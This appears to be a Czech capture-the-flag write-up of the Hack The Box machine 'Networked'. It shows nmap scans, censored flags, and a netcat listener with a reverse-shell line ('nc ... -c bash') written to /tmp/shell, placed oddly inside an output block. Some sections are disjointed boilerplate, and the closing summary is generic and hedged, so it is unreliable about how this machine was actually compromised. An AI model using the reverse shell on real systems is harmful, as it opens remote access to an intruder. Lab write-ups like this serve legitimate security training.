---
layout: post
author: Tomáš Matějíček
title: "Networked"
date: 2020-12-20
tags: ssh sudo php exploit enumeration privesc
---

## Úvod a kontext

Networked je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap -p 1-65535 -T4 -A -sC -v $IP
```
```
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
ca
```

### Vyhledání otevřených portů (2)

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap -sU -T4 -v $IP
```
```
PORT      STATE         SERVICE
684/udp   open|filtered corba-iiop-ssl
776/udp   open|filtered wpages
838/udp   open|filtered unknown
1101/udp  open|filtered pt2-discover
2002/udp  open|filtered globe
2161/udp  open|filtered apc-2161
5353/udp  open|filtered zeroconf
9950/udp  open|filtered apc-9950
16548/udp open|filtered unknown
16697/udp open|filtered unknown
17629/udp open|filtered unknown
17754/udp open|filtered zep
19718/udp open|filtered unknown
20522/udp open|filtered unknown
21212/udp open|filtered unknown
21320/udp open|filtered unknown
21663/udp open|filtered unknown
25280/udp open|filtered unknown
25375/udp open|filtered unknown
27195/udp open|filtered unknown
28465/udp open|filtered unknown
31681/udp open|filtered unknown
32798/udp open|filtered unknown
38412/udp open|filtered unknown
40724/udp open|filtered unknown
40732/udp open|filtered unknown
42577/udp open|filtered unknown
44160/udp open|filtered unknown
47981/udp open|filtered unknown
49188/udp open|filtered unknown
49220/udp open|filtered unknown
61319/udp open|filtered unknown
```

## Analýza zjištění

### Přílohy

![Networked-shell.php.gif](/assets/images/posts/Networked/Networked-shell.php.gif)

## Získání přístupu

### Přihlášení na cíl

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```text
22 OpenSSH 7.4 (protocol 2.0)
```
```
- Ověřit enumeraci SSH uživatelů
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
```bash
cat /home/guly/user.txt
```
```
__CENSORED__
netcat -lvp 4002
echo nc 10.10.15.13 4002 -c bash > /tmp/shell
chmod +x /tmp/shell
```

## Eskalace oprávnění

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
```bash
cat root.txt
```
```
__CENSORED__
```

## Shrnutí klíčových poznatků

- Úvodní směr určovala webová enumerace: důležité nebylo jen něco najít, ale správně vyhodnotit, který artefakt skutečně otevírá další krok.
- K uživatelskému přístupu vedla práce s nalezenými přihlašovacími údaji, klíči nebo hashi a jejich ověření proti reálně dostupné službě.
- Eskalace oprávnění stála na příliš širokém `sudo` pravidle nebo na možnosti ovlivnit vstup či prostředí privilegovaného procesu.

## Co si odnést do praxe

- Veřejně dostupné webové aplikace a administrační endpointy je potřeba průběžně inventarizovat a zavírat, protože právě ony často otevírají první krok celého řetězce.
- SSH klíče, hesla a uložené tokeny je nutné oddělovat mezi účty i službami; znovupoužití přístupů rychle mění lokální únik ve stabilní shell.
- Pravidla `sudo` mají být co nejmenší a bez možnosti ovlivnit příkaz, argumenty nebo prostředí z neprivilegovaného kontextu.
- Inventura verzí a včasné záplatování snižují prostor pro přímé zneužití známých chyb i pro slepé spoléhání na zastaralé komponenty.